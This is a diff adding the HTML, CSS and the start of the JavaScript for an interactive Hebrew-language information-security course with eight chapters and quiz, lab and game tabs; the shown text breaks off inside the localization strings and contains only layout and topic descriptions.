@@ -1,0 +1,2003 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>InfoSec Course</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=IBM+Plex+Sans+Hebrew:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:#fafafa;--bg2:#ffffff;--bg3:#f4f4f5;
+  --surface:#ffffff;--surface2:#f4f4f5;
+  --border:rgba(153,27,27,0.12);--border2:rgba(153,27,27,0.3);
+  --accent:#991b1b;--accent2:#b91c1c;--accent3:#dc2626;
+  --accent-dim:rgba(153,27,27,0.06);--accent-glow:rgba(220,38,38,0.2);
+  --green:#15803d;--red:#b91c1c;--blue:#1d4ed8;--orange:#c2410c;--purple:#6d28d9;
+  --text:#09090b;--text-dim:#3f3f46;--text-muted:#71717a;
+  --mono:'JetBrains Mono',monospace;--sans:'IBM Plex Sans Hebrew',sans-serif;--display:'Space Grotesk',sans-serif;
+  --radius:8px;--sidebar:276px;--tab-h:48px;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:var(--sans);background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
+
+/* ===== HEADER ===== */
+.header{position:fixed;top:0;left:0;right:0;height:52px;background:rgba(255,255,255,0.97);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 18px;gap:14px;z-index:200;box-shadow:0 1px 3px rgba(0,0,0,0.05)}
+.header-logo{font-family:var(--display);font-size:15px;font-weight:700;color:var(--accent);letter-spacing:.5px;white-space:nowrap;display:flex;align-items:center;gap:6px}
+.header-logo .shield{width:22px;height:22px;background:var(--accent);border-radius:4px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:11px}
+.header-sep{width:1px;height:20px;background:var(--border);flex-shrink:0}
+.header-chname{font-family:var(--display);font-size:12px;color:var(--text-muted);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.header-xp{display:flex;align-items:center;gap:8px;flex-shrink:0}
+.xp-bar-wrap{width:100px;height:4px;background:var(--surface2);border-radius:2px;border:1px solid var(--border)}
+.xp-bar-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent3));border-radius:2px;transition:width .5s ease}
+.xp-label{font-family:var(--mono);font-size:10px;color:var(--accent);white-space:nowrap;font-weight:600}
+.lang-btn{display:flex;align-items:center;gap:5px;padding:4px 10px;border-radius:20px;border:1px solid var(--border2);background:var(--bg3);color:var(--text-dim);font-family:var(--display);font-size:11px;font-weight:600;cursor:pointer;transition:all .15s;flex-shrink:0}
+.lang-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
+.mobile-btn{display:none;background:none;border:1px solid var(--border);border-radius:6px;color:var(--accent);padding:5px 9px;cursor:pointer;font-size:14px}
+
+/* ===== SIDEBAR ===== */
+.sidebar{position:fixed;top:52px;right:0;bottom:0;width:var(--sidebar);background:var(--bg2);border-left:1px solid var(--border);overflow-y:auto;z-index:100;padding:12px 0}
+.sidebar::-webkit-scrollbar{width:3px}
+.sidebar::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+.sb-label{font-family:var(--display);font-size:9px;color:var(--text-muted);letter-spacing:2px;text-transform:uppercase;padding:0 14px 8px;font-weight:600}
+.ch-btn{width:100%;display:flex;align-items:center;gap:9px;padding:8px 14px;background:none;border:none;cursor:pointer;text-align:right;transition:background .12s;border-right:3px solid transparent;position:relative}
+.ch-btn:hover{background:var(--accent-dim)}
+.ch-btn.active{background:var(--accent-dim);border-right-color:var(--accent)}
+.ch-num{font-family:var(--mono);font-size:10px;font-weight:700;color:var(--accent);background:rgba(153,27,27,0.08);border:1px solid rgba(153,27,27,0.2);border-radius:4px;width:24px;height:20px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.ch-title-text{font-size:12px;color:var(--text-muted);font-weight:500;line-height:1.3;flex:1;text-align:right;font-family:var(--sans)}
+.ch-btn.active .ch-title-text{color:var(--text);font-weight:600}
+.ch-stars{font-size:9px;flex-shrink:0}
+
+/* ===== MAIN ===== */
+.main{margin-right:var(--sidebar);padding-top:52px;min-height:100vh}
+.chapter{display:none}
+.chapter.active{display:block}
+
+/* ===== HERO ===== */
+.ch-hero{padding:32px 36px 0;border-bottom:1px solid var(--border);background:linear-gradient(135deg,rgba(153,27,27,0.04) 0%,transparent 60%);position:relative;overflow:hidden}
+.ch-hero::before{content:attr(data-num);position:absolute;left:12px;top:-12px;font-family:var(--display);font-size:120px;font-weight:700;color:rgba(153,27,27,0.04);line-height:1;pointer-events:none;letter-spacing:-4px}
+.ch-tag{font-family:var(--mono);font-size:9px;color:var(--accent);letter-spacing:3px;text-transform:uppercase;margin-bottom:5px;font-weight:600}
+.ch-title{font-family:var(--display);font-size:24px;font-weight:700;color:var(--text);margin-bottom:7px;line-height:1.2}
+.ch-desc{font-size:13px;color:var(--text-muted);margin-bottom:20px;max-width:600px;line-height:1.65}
+
+/* ===== TABS ===== */
+.tabs-bar{display:flex;border-top:1px solid var(--border);background:var(--bg2);position:sticky;top:52px;z-index:50;overflow-x:auto;box-shadow:0 1px 2px rgba(0,0,0,0.04)}
+.tab-btn{display:flex;align-items:center;gap:5px;padding:0 16px;height:var(--tab-h);background:none;border:none;border-bottom:2px solid transparent;cursor:pointer;font-family:var(--display);font-size:12px;font-weight:600;color:var(--text-muted);transition:all .12s;white-space:nowrap}
+.tab-btn:hover{color:var(--text);background:var(--accent-dim)}
+.tab-btn.active{color:var(--accent);border-bottom-color:var(--accent);background:var(--accent-dim)}
+
+/* ===== CONTENT ===== */
+.tab-panels{padding:26px 36px 56px}
+.tab-panel{display:none}
+.tab-panel.active{display:block}
+
+.section-title{font-family:var(--display);font-size:11px;font-weight:700;color:var(--accent);letter-spacing:1.5px;text-transform:uppercase;margin:26px 0 12px;display:flex;align-items:center;gap:10px}
+.section-title::after{content:'';flex:1;height:1px;background:var(--border)}
+.prose{font-size:14px;color:var(--text-dim);line-height:1.75;margin-bottom:14px}
+.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:14px 0}
+.grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin:14px 0}
+.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:16px;transition:all .18s}
+.card:hover{border-color:var(--border2);transform:translateY(-2px);box-shadow:0 4px 16px rgba(153,27,27,0.07)}
+.card-icon{font-size:22px;margin-bottom:8px}
+.card-title{font-size:13px;font-weight:700;color:var(--text);margin-bottom:5px;font-family:var(--display)}
+.card-body{font-size:12px;color:var(--text-muted);line-height:1.6}
+.table-wrap{overflow-x:auto;margin:14px 0;border-radius:var(--radius);border:1px solid var(--border)}
+.data-table{width:100%;border-collapse:collapse;font-size:12px}
+.data-table th{background:var(--bg3);color:var(--accent);font-family:var(--display);font-size:10px;letter-spacing:1px;text-transform:uppercase;padding:9px 12px;text-align:right;border-bottom:1px solid var(--border)}
+.data-table td{padding:9px 12px;border-bottom:1px solid var(--border);color:var(--text-dim);vertical-align:top}
+.data-table tr:last-child td{border-bottom:none}
+.data-table tr:hover td{background:var(--accent-dim)}
+.code-block{background:#0c0a09;border:1px solid rgba(153,27,27,0.15);border-radius:var(--radius);padding:18px;font-family:var(--mono);font-size:12.5px;color:#fca5a5;overflow-x:auto;margin:14px 0;line-height:1.7}
+.code-block .comment{color:#57534e}
+.code-block .key{color:#fb923c}
+.code-block .val{color:#86efac}
+.inline-code{font-family:var(--mono);font-size:11px;background:rgba(153,27,27,0.07);border:1px solid rgba(153,27,27,0.15);border-radius:3px;padding:1px 5px;color:var(--accent2)}
+.callout{border-radius:var(--radius);padding:13px 17px;margin:14px 0;font-size:13px;line-height:1.65;border-right:3px solid}
+.callout-info{background:rgba(29,78,216,0.05);border-color:var(--blue);color:var(--text-dim)}
+.callout-warn{background:rgba(194,65,12,0.05);border-color:var(--orange);color:var(--text-dim)}
+.callout-danger{background:rgba(185,28,28,0.05);border-color:var(--red);color:var(--text-dim)}
+.callout-success{background:rgba(21,128,61,0.05);border-color:var(--green);color:var(--text-dim)}
+.incident-box{background:rgba(185,28,28,0.04);border:1px solid rgba(185,28,28,0.2);border-radius:var(--radius);padding:18px;margin:18px 0}
+.incident-title{font-size:12px;font-weight:700;color:var(--red);font-family:var(--display);margin-bottom:8px;display:flex;align-items:center;gap:6px}
+.incident-body{font-size:13px;color:var(--text-dim);line-height:1.65}
+.did-you-know{background:linear-gradient(135deg,rgba(109,40,217,0.06),rgba(153,27,27,0.04));border:1px solid rgba(109,40,217,0.2);border-right:3px solid #6d28d9;border-radius:var(--radius);padding:13px 17px;margin:0 0 20px;font-size:13px;color:var(--text-dim);line-height:1.65}
+.did-you-know strong{color:#6d28d9}
+.flow-row{display:flex;align-items:center;gap:8px;flex-wrap:wrap;padding:16px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);margin:14px 0}
+.flow-step{background:var(--surface);border:1px solid var(--border2);border-radius:6px;padding:10px 13px;text-align:center;min-width:80px;box-shadow:0 1px 3px rgba(0,0,0,0.05)}
+.flow-step-icon{font-size:20px;margin-bottom:3px}
+.flow-step-label{font-size:10px;color:var(--text-muted);font-family:var(--display);font-weight:600}
+.flow-arrow{color:var(--accent);font-size:16px;font-weight:700;flex-shrink:0}
+.threat-badge{display:inline-flex;align-items:center;gap:4px;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:700;font-family:var(--display)}
+.badge-critical{background:rgba(185,28,28,0.12);color:var(--red);border:1px solid rgba(185,28,28,0.25)}
+.badge-high{background:rgba(194,65,12,0.1);color:var(--orange);border:1px solid rgba(194,65,12,0.25)}
+.badge-medium{background:rgba(161,98,7,0.1);color:#92400e;border:1px solid rgba(161,98,7,0.25)}
+.badge-low{background:rgba(21,128,61,0.08);color:var(--green);border:1px solid rgba(21,128,61,0.2)}
+
+/* ===== QUIZ ===== */
+.quiz-wrap{max-width:700px}
+.quiz-prog{display:flex;gap:5px;margin-bottom:22px}
+.quiz-pip{flex:1;height:3px;border-radius:2px;background:var(--surface2);transition:background .25s}
+.quiz-pip.done{background:var(--accent)}
+.quiz-pip.cur{background:var(--accent3)}
+.quiz-q-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:24px;margin-bottom:18px;display:none;box-shadow:0 1px 3px rgba(0,0,0,0.04)}
+.quiz-q-card.active{display:block;animation:fadeUp .2s ease}
+@keyframes fadeUp{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}
+.quiz-meta{font-family:var(--mono);font-size:10px;color:var(--text-muted);margin-bottom:10px;display:flex;justify-content:space-between}
+.quiz-q{font-size:15px;font-weight:600;color:var(--text);margin-bottom:16px;line-height:1.5;font-family:var(--display)}
+.quiz-opts{display:flex;flex-direction:column;gap:8px}
+.quiz-opt{display:flex;align-items:center;gap:11px;padding:10px 14px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;cursor:pointer;transition:all .12s;text-align:right;font-size:13px;color:var(--text-dim);width:100%}
+.quiz-opt:hover:not(.disabled){border-color:var(--border2);color:var(--text);background:var(--accent-dim)}
+.quiz-opt.selected{border-color:var(--accent3);background:rgba(220,38,38,0.07);color:var(--text)}
+.quiz-opt.correct{border-color:var(--green)!important;background:rgba(21,128,61,0.07)!important;color:var(--green)!important}
+.quiz-opt.wrong{border-color:var(--red)!important;background:rgba(185,28,28,0.07)!important;color:var(--red)!important}
+.quiz-opt.disabled{cursor:not-allowed}
+.opt-letter{font-family:var(--mono);font-size:10px;font-weight:700;width:22px;height:22px;border-radius:4px;display:flex;align-items:center;justify-content:center;background:var(--surface2);color:var(--text-muted);flex-shrink:0;transition:all .12s}
+.quiz-opt.selected .opt-letter{background:var(--accent3);color:#fff}
+.quiz-opt.correct .opt-letter{background:var(--green);color:#fff}
+.quiz-opt.wrong .opt-letter{background:var(--red);color:#fff}
+.quiz-exp{background:rgba(153,27,27,0.04);border:1px solid rgba(153,27,27,0.15);border-radius:6px;padding:12px 15px;margin-top:12px;font-size:12px;color:var(--text-dim);line-height:1.65;animation:fadeUp .15s ease}
+.quiz-exp strong{color:var(--accent);font-family:var(--display)}
+.quiz-nav{display:flex;gap:8px;justify-content:space-between;align-items:center;margin-top:16px}
+.btn{padding:8px 18px;border-radius:6px;font-size:12px;font-weight:600;cursor:pointer;transition:all .15s;border:none;font-family:var(--display);letter-spacing:.2px}
+.btn-primary{background:var(--accent);color:#fff}
+.btn-primary:hover{background:var(--accent2);box-shadow:0 2px 10px rgba(153,27,27,0.3)}
+.btn-primary:disabled{opacity:.3;cursor:not-allowed;box-shadow:none}
+.btn-ghost{background:var(--bg3);color:var(--text-dim);border:1px solid var(--border)}
+.btn-ghost:hover{border-color:var(--border2);color:var(--text)}
+.quiz-result{background:var(--surface);border:1px solid var(--border2);border-radius:12px;padding:32px;text-align:center;display:none;box-shadow:0 4px 20px rgba(153,27,27,0.07)}
+.quiz-result.visible{display:block;animation:fadeUp .3s ease}
+.result-emoji{font-size:50px;margin-bottom:10px}
+.result-score{font-family:var(--display);font-size:44px;font-weight:700;color:var(--accent);margin-bottom:6px}
+.result-label{font-size:14px;color:var(--text-muted);margin-bottom:18px}
+.result-stars{font-size:24px;margin-bottom:16px;letter-spacing:3px}
+
+/* ===== LAB ===== */
+.lab-wrap{max-width:780px}
+.lab-ex{background:var(--surface);border:1px solid var(--border);border-radius:10px;margin-bottom:12px;overflow:hidden;box-shadow:0 1px 2px rgba(0,0,0,0.04)}
+.lab-ex-hdr{display:flex;align-items:flex-start;gap:11px;padding:14px 17px;cursor:pointer;transition:background .12s}
+.lab-ex-hdr:hover{background:var(--accent-dim)}
+.lab-num{font-family:var(--mono);font-size:10px;font-weight:700;color:var(--accent);background:rgba(153,27,27,0.08);border:1px solid rgba(153,27,27,0.2);border-radius:4px;width:28px;height:20px;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
+.lab-q{flex:1;font-size:14px;color:var(--text);font-weight:500;line-height:1.4}
+.lab-chevron{color:var(--accent);font-size:14px;transition:transform .2s;flex-shrink:0}
+.lab-ex.open .lab-chevron{transform:rotate(180deg)}
+.lab-ans-wrap{max-height:0;overflow:hidden;transition:max-height .3s ease}
+.lab-ex.open .lab-ans-wrap{max-height:700px}
+.lab-ans-inner{padding:0 17px 17px;border-top:1px solid var(--border);padding-top:13px}
+.lab-ans-pre{background:#0c0a09;border:1px solid rgba(153,27,27,0.12);border-radius:6px;padding:13px;font-family:var(--mono);font-size:12px;color:#fca5a5;white-space:pre-wrap;word-break:break-all;line-height:1.6;margin-bottom:9px}
+.lab-explain{font-size:12px;color:var(--text-dim);line-height:1.65;background:rgba(153,27,27,0.03);border-right:3px solid rgba(153,27,27,0.18);border-radius:3px;padding:8px 12px}
+
+/* ===== GAME ===== */
+.game-wrap{max-width:640px}
+.game-start-card{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:40px;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,0.05)}
+.game-icon{font-size:56px;margin-bottom:12px}
+.game-start-title{font-family:var(--display);font-size:20px;font-weight:700;color:var(--accent);margin-bottom:8px;letter-spacing:.5px}
+.game-start-desc{font-size:13px;color:var(--text-muted);line-height:1.6;margin-bottom:22px}
+.game-rules{display:flex;gap:10px;justify-content:center;margin-bottom:22px;flex-wrap:wrap}
+.game-rule{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:7px 13px;font-family:var(--display);font-size:11px;color:var(--text-muted)}
+.game-rule span{color:var(--accent);font-weight:700}
+.game-hud{display:flex;align-items:center;justify-content:space-between;padding:11px 16px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;margin-bottom:16px}
+.hud-timer{font-family:var(--display);font-size:24px;font-weight:700;color:var(--accent);transition:color .3s}
+.hud-timer.urgent{color:var(--red);animation:pulse .5s ease infinite alternate}
+@keyframes pulse{from{opacity:1}to{opacity:.5}}
+.hud-score{font-family:var(--display);font-size:17px;font-weight:700;color:var(--accent2)}
+.hud-qnum{font-family:var(--mono);font-size:11px;color:var(--text-muted)}
+.game-q{font-size:17px;font-weight:600;color:var(--text);margin-bottom:16px;line-height:1.45;min-height:50px;font-family:var(--display)}
+.game-opts{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}
+.game-opt{padding:12px 13px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;cursor:pointer;font-size:12px;color:var(--text-dim);transition:all .12s;text-align:center;font-family:var(--sans)}
+.game-opt:hover:not(.disabled){border-color:var(--border2);color:var(--text);background:var(--accent-dim);transform:scale(1.02)}
+.game-opt.correct{border-color:var(--green);background:rgba(21,128,61,0.08);color:var(--green);animation:pop .3s ease}
+.game-opt.wrong{border-color:var(--red);background:rgba(185,28,28,0.07);color:var(--red)}
+.game-opt.disabled{cursor:not-allowed}
+@keyframes pop{0%{transform:scale(1)}50%{transform:scale(1.04)}100%{transform:scale(1)}}
+.game-fb{text-align:center;font-family:var(--display);font-size:16px;font-weight:700;height:24px;margin-bottom:4px}
+.game-fb.ok{color:var(--green)}.game-fb.bad{color:var(--red)}
+.game-over-card{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:36px;text-align:center;animation:fadeUp .35s ease;box-shadow:0 4px 20px rgba(0,0,0,0.06)}
+.game-over-score{font-family:var(--display);font-size:50px;font-weight:700;color:var(--accent)}
+.game-over-title{font-size:16px;color:var(--text-muted);margin:5px 0 18px}
+.leaderboard{margin-top:20px;text-align:right}
+.lb-title{font-family:var(--display);font-size:9px;color:var(--accent);letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;font-weight:700}
+.lb-row{display:flex;align-items:center;gap:8px;padding:6px 10px;border-radius:5px;margin-bottom:4px;font-size:12px}
+.lb-row.gold{background:rgba(234,179,8,0.07);border:1px solid rgba(234,179,8,0.2)}
+.lb-row.silver{background:rgba(100,116,139,0.05);border:1px solid rgba(100,116,139,0.15)}
+.lb-row.bronze{background:rgba(180,120,80,0.05);border:1px solid rgba(180,120,80,0.15)}
+.lb-row.normal{background:var(--bg3);border:1px solid var(--border)}
+.lb-rank{font-family:var(--mono);font-weight:700;color:var(--text-muted);width:20px;flex-shrink:0}
+.lb-name{flex:1;color:var(--text-dim)}.lb-pts{font-family:var(--mono);font-weight:700;color:var(--accent)}
+
+/* ===== CHEAT ===== */
+.cheat-grid{display:grid;grid-template-columns:1fr 1fr;gap:13px}
+.cheat-card{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:15px;box-shadow:0 1px 3px rgba(0,0,0,0.04)}
+.cheat-card-title{font-family:var(--display);font-size:10px;font-weight:700;color:var(--accent);letter-spacing:1px;text-transform:uppercase;margin-bottom:10px;padding-bottom:7px;border-bottom:1px solid var(--border)}
+.cheat-item{display:flex;justify-content:space-between;align-items:baseline;padding:4px 0;border-bottom:1px solid var(--border);font-size:12px}
+.cheat-item:last-child{border-bottom:none}
+.cheat-key{color:var(--text-dim)}.cheat-val{font-family:var(--mono);color:var(--accent2);font-size:11px}
+
+@media(max-width:860px){
+  :root{--sidebar:0px}
+  .sidebar{transform:translateX(100%);transition:transform .25s;width:276px}
+  .sidebar.open{transform:translateX(0)}
+  .main{margin-right:0}
+  .tab-panels{padding:18px 16px 40px}
+  .ch-hero{padding:22px 16px 0}
+  .grid-2,.grid-3,.game-opts,.cheat-grid{grid-template-columns:1fr}
+  .mobile-btn{display:flex}
+  .header-xp{display:none}
+  .tabs-bar{overflow-x:auto}
+}
+</style>
+</head>
+<body>
+<header class="header">
+  <button class="mobile-btn" onclick="toggleSidebar()">☰</button>
+  <div class="header-logo"><div class="shield">🛡</div>InfoSec</div>
+  <div class="header-sep"></div>
+  <div class="header-chname" id="headerChName"></div>
+  <div class="header-xp">
+    <div class="xp-bar-wrap"><div class="xp-bar-fill" id="xpBar" style="width:0%"></div></div>
+    <div class="xp-label" id="xpLabel">0 XP</div>
+  </div>
+  <button class="lang-btn" id="langBtn" onclick="toggleLang()">🇬🇧 EN</button>
+</header>
+<nav class="sidebar" id="sidebar">
+  <div class="sb-label" id="sbLabel"></div>
+  <button class="ch-btn active" id="nav-0" onclick="showChapter(0)"><span class="ch-num">0</span><span class="ch-title-text" id="chname-0"></span><span class="ch-stars" id="stars-0"></span></button>
+  <button class="ch-btn" id="nav-1" onclick="showChapter(1)"><span class="ch-num">1</span><span class="ch-title-text" id="chname-1"></span><span class="ch-stars" id="stars-1"></span></button>
+  <button class="ch-btn" id="nav-2" onclick="showChapter(2)"><span class="ch-num">2</span><span class="ch-title-text" id="chname-2"></span><span class="ch-stars" id="stars-2"></span></button>
+  <button class="ch-btn" id="nav-3" onclick="showChapter(3)"><span class="ch-num">3</span><span class="ch-title-text" id="chname-3"></span><span class="ch-stars" id="stars-3"></span></button>
+  <button class="ch-btn" id="nav-4" onclick="showChapter(4)"><span class="ch-num">4</span><span class="ch-title-text" id="chname-4"></span><span class="ch-stars" id="stars-4"></span></button>
+  <button class="ch-btn" id="nav-5" onclick="showChapter(5)"><span class="ch-num">5</span><span class="ch-title-text" id="chname-5"></span><span class="ch-stars" id="stars-5"></span></button>
+  <button class="ch-btn" id="nav-6" onclick="showChapter(6)"><span class="ch-num">6</span><span class="ch-title-text" id="chname-6"></span><span class="ch-stars" id="stars-6"></span></button>
+  <button class="ch-btn" id="nav-7" onclick="showChapter(7)"><span class="ch-num">7</span><span class="ch-title-text" id="chname-7"></span><span class="ch-stars" id="stars-7"></span></button>
+</nav>
+<main class="main" id="main">
+<section class="chapter active" id="ch-0">
+  <div class="ch-hero" data-num="00">
+    <div class="ch-tag" id="chtag-0"></div>
+    <h1 class="ch-title" id="chtitle-0"></h1>
+    <p class="ch-desc" id="chdesc-0"></p>
+    <div class="tabs-bar" id="tabs-0"></div>
+  </div>
+  <div class="tab-panels">
+    <div class="tab-panel active" id="0-learn"><div id="learn-0"></div></div>
+    <div class="tab-panel" id="0-quiz"><div class="quiz-wrap" id="quiz-0"></div></div>
+    <div class="tab-panel" id="0-lab"><div class="lab-wrap" id="lab-0"></div></div>
+    <div class="tab-panel" id="0-game"><div class="game-wrap" id="game-0"></div></div>
+    <div class="tab-panel" id="0-cheat"><div id="cheat-0"></div></div>
+  </div>
+</section>
+<section class="chapter" id="ch-1">
+  <div class="ch-hero" data-num="01">
+    <div class="ch-tag" id="chtag-1"></div>
+    <h1 class="ch-title" id="chtitle-1"></h1>
+    <p class="ch-desc" id="chdesc-1"></p>
+    <div class="tabs-bar" id="tabs-1"></div>
+  </div>
+  <div class="tab-panels">
+    <div class="tab-panel active" id="1-learn"><div id="learn-1"></div></div>
+    <div class="tab-panel" id="1-quiz"><div class="quiz-wrap" id="quiz-1"></div></div>
+    <div class="tab-panel" id="1-lab"><div class="lab-wrap" id="lab-1"></div></div>
+    <div class="tab-panel" id="1-game"><div class="game-wrap" id="game-1"></div></div>
+    <div class="tab-panel" id="1-cheat"><div id="cheat-1"></div></div>
+  </div>
+</section>
+<section class="chapter" id="ch-2">
+  <div class="ch-hero" data-num="02">
+    <div class="ch-tag" id="chtag-2"></div>
+    <h1 class="ch-title" id="chtitle-2"></h1>
+    <p class="ch-desc" id="chdesc-2"></p>
+    <div class="tabs-bar" id="tabs-2"></div>
+  </div>
+  <div class="tab-panels">
+    <div class="tab-panel active" id="2-learn"><div id="learn-2"></div></div>
+    <div class="tab-panel" id="2-quiz"><div class="quiz-wrap" id="quiz-2"></div></div>
+    <div class="tab-panel" id="2-lab"><div class="lab-wrap" id="lab-2"></div></div>
+    <div class="tab-panel" id="2-game"><div class="game-wrap" id="game-2"></div></div>
+    <div class="tab-panel" id="2-cheat"><div id="cheat-2"></div></div>
+  </div>
+</section>
+<section class="chapter" id="ch-3">
+  <div class="ch-hero" data-num="03">
+    <div class="ch-tag" id="chtag-3"></div>
+    <h1 class="ch-title" id="chtitle-3"></h1>
+    <p class="ch-desc" id="chdesc-3"></p>
+    <div class="tabs-bar" id="tabs-3"></div>
+  </div>
+  <div class="tab-panels">
+    <div class="tab-panel active" id="3-learn"><div id="learn-3"></div></div>
+    <div class="tab-panel" id="3-quiz"><div class="quiz-wrap" id="quiz-3"></div></div>
+    <div class="tab-panel" id="3-lab"><div class="lab-wrap" id="lab-3"></div></div>
+    <div class="tab-panel" id="3-game"><div class="game-wrap" id="game-3"></div></div>
+    <div class="tab-panel" id="3-cheat"><div id="cheat-3"></div></div>
+  </div>
+</section>
+<section class="chapter" id="ch-4">
+  <div class="ch-hero" data-num="04">
+    <div class="ch-tag" id="chtag-4"></div>
+    <h1 class="ch-title" id="chtitle-4"></h1>
+    <p class="ch-desc" id="chdesc-4"></p>
+    <div class="tabs-bar" id="tabs-4"></div>
+  </div>
+  <div class="tab-panels">
+    <div class="tab-panel active" id="4-learn"><div id="learn-4"></div></div>
+    <div class="tab-panel" id="4-quiz"><div class="quiz-wrap" id="quiz-4"></div></div>
+    <div class="tab-panel" id="4-lab"><div class="lab-wrap" id="lab-4"></div></div>
+    <div class="tab-panel" id="4-game"><div class="game-wrap" id="game-4"></div></div>
+    <div class="tab-panel" id="4-cheat"><div id="cheat-4"></div></div>
+  </div>
+</section>
+<section class="chapter" id="ch-5">
+  <div class="ch-hero" data-num="05">
+    <div class="ch-tag" id="chtag-5"></div>
+    <h1 class="ch-title" id="chtitle-5"></h1>
+    <p class="ch-desc" id="chdesc-5"></p>
+    <div class="tabs-bar" id="tabs-5"></div>
+  </div>
+  <div class="tab-panels">
+    <div class="tab-panel active" id="5-learn"><div id="learn-5"></div></div>
+    <div class="tab-panel" id="5-quiz"><div class="quiz-wrap" id="quiz-5"></div></div>
+    <div class="tab-panel" id="5-lab"><div class="lab-wrap" id="lab-5"></div></div>
+    <div class="tab-panel" id="5-game"><div class="game-wrap" id="game-5"></div></div>
+    <div class="tab-panel" id="5-cheat"><div id="cheat-5"></div></div>
+  </div>
+</section>
+<section class="chapter" id="ch-6">
+  <div class="ch-hero" data-num="06">
+    <div class="ch-tag" id="chtag-6"></div>
+    <h1 class="ch-title" id="chtitle-6"></h1>
+    <p class="ch-desc" id="chdesc-6"></p>
+    <div class="tabs-bar" id="tabs-6"></div>
+  </div>
+  <div class="tab-panels">
+    <div class="tab-panel active" id="6-learn"><div id="learn-6"></div></div>
+    <div class="tab-panel" id="6-quiz"><div class="quiz-wrap" id="quiz-6"></div></div>
+    <div class="tab-panel" id="6-lab"><div class="lab-wrap" id="lab-6"></div></div>
+    <div class="tab-panel" id="6-game"><div class="game-wrap" id="game-6"></div></div>
+    <div class="tab-panel" id="6-cheat"><div id="cheat-6"></div></div>
+  </div>
+</section>
+<section class="chapter" id="ch-7">
+  <div class="ch-hero" data-num="07">
+    <div class="ch-tag" id="chtag-7"></div>
+    <h1 class="ch-title" id="chtitle-7"></h1>
+    <p class="ch-desc" id="chdesc-7"></p>
+    <div class="tabs-bar" id="tabs-7"></div>
+  </div>
+  <div class="tab-panels">
+    <div class="tab-panel active" id="7-learn"><div id="learn-7"></div></div>
+    <div class="tab-panel" id="7-quiz"><div class="quiz-wrap" id="quiz-7"></div></div>
+    <div class="tab-panel" id="7-lab"><div class="lab-wrap" id="lab-7"></div></div>
+    <div class="tab-panel" id="7-game"><div class="game-wrap" id="game-7"></div></div>
+    <div class="tab-panel" id="7-cheat"><div id="cheat-7"></div></div>
+  </div>
+</section>
+</main>
+<script>
+const C = {
+he:{
+  dir:'rtl',lang:'he',langBtn:'🇬🇧 EN',sbLabel:'פרקים',
+  names:['מבוא לאבטחה','קריפטוגרפיה','אבטחת רשתות','Web Security','Authentication & IAM','Malware & Social Eng','Incident Response','Compliance & Risk'],
+  tags:['// פרק 00','// פרק 01','// פרק 02','// פרק 03','// פרק 04','// פרק 05','// פרק 06','// פרק 07'],
+  descs:[
+    'CIA Triad, threat modeling, attack surface ו-defense in depth — הבסיס של כל מקצועי אבטחה',
+    'Symmetric, asymmetric, hashing, PKI ו-TLS — כיצד הצפנה מגנה על הנתונים שלנו',
+    'Firewalls, IDS/IPS, VPN, Zero Trust ו-segmentation — אבטחת רשת מקצה לקצה',
+    'OWASP Top 10, XSS, SQL Injection, CSRF ו-CSP — כיצד תוקפים פורצים לאפליקציות web',
+    'MFA, OAuth 2.0, JWT, RBAC ו-Zero Trust — זהות והרשאות בעולם המודרני',
+    'Phishing, ransomware, APT, social engineering — כיצד רוב הפרצות מתחילות',
+    'Detection, containment, eradication, recovery — איך מגיבים לתקיפה בזמן אמת',
+    'GDPR, ISO 27001, risk management, DPIA — אבטחה כדרישה עסקית וחוקית'
+  ],
+  tabs:['📖 למידה','🎯 חידון','🛠️ מעבדה','🎮 משחק','📋 סיכום'],
+  tabKeys:['learn','quiz','lab','game','cheat'],
+  gameTitle:'THREAT QUIZ',gameDesc:'ענה על שאלות מהר ככל האפשר. כל תשובה נכונה = +10 נקודות.',
+  gameStart:'▶ התחל',gameSeconds:'שניות',gameQuestions:'שאלות',gameXP:'+10 XP',
+  gameAgain:'🔄 שוב',gameToCheat:'📋 סיכום ←',
+  quizPrev:'→ הקודם',quizNext:'הבא ←',quizSubmit:'שלח ✓',
+  quizExplain:'💡 הסבר:',quizToLab:'למעבדה ←',quizAgain:'🔄 נסי שוב',
+  resultLabels:['נסי שוב!','עוד קצת...','טוב!','כל הכבוד!','מצוין!','מושלם! 🛡️'],
+  lbTitle:'// לוח תוצאות',labExplain:'💡 הסבר:',
+  points:"נק'",of:'מתוך',question:'שאלה',
+  optLetters:['א','ב','ג','ד'],playerName:'את',unknownPlayer:'שחקן',pct:'% נכון',
